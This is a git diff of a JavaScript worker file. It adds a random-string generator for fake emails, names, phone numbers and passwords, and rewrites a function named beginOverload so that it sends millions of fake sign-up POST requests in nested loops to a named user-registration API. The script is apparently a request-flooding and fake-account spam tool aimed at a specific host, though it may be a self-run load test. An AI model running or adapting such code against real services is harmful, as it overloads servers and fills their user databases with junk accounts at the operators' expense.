@@ -1,32 +1,55 @@
+var url =
+  "ABCDEFGHIJKLMNQRTUVWXYZabcdefghijklmnopqrstuvwxyz";
+var phone = "0123456789";
+
+function randomize(size, type = url, radix = 48) {
+  size = size || 21;
+  var id = "";
+  while (0 < size--) {
+    id += type[(Math.random() * radix) | 0];
+  }
+  return id;
+}
+
 //const for loop
-const number = 70000000; //70million
+const number = 7000000; //70million, do not try this in production
 
 //@todo - generate randon usernames and emails with alphanumeric ids
-const dummyData = {
-  email: "script104nw@deed.iom",
-  first_name: "nyugen",
-  last_name: "laksn",
-  password: "11111111",
-  phone: "192019201",
-  username: "redun"
-};
+function dummymizeData() {
+  const range = Math.floor(Math.random() * 8) + 4;
+  const data = {
+    email: `${randomize(8)}@gmail.com`,
+    first_name: randomize(range),
+    last_name: randomize(range),
+    password: randomize(30),
+    phone: `080${randomize(8, phone, 7)}`,
+    username: randomize(range)
+  };
+  return data;
+}
+
 function beginOverload() {
-  fetch("https://api.masterclasschioma.com/v1/user/add", {
-    method: "POST", // *GET, POST, PUT, DELETE, etc.
-    // mode: "cors", // no-cors, cors, *same-origin
-    cache: "no-cache",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify(dummyData)
-  })
-    .then(response => {
-      let v = response.json();
-      v.then(e => console.log(e));
-      console.log(v);
+  let count = 0
+   while (count < number) {
+  for (let i = 0; i < number; i++) {
+    console.log(count);
+    fetch("https://api.masterclasschioma.com/v1/user/add", {
+      method: "POST",
+      cache: "no-cache",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(dummymizeData())
     })
-    .catch(e => console.error(e));
-  return "done";
+      .then(response => {
+        let v = response.json();
+        v.then(e => console.log(e));
+      })
+      .catch(e => console.error(e));
+      count++;
+  }
+    return "done";
+}
 }
 
 self.addEventListener(
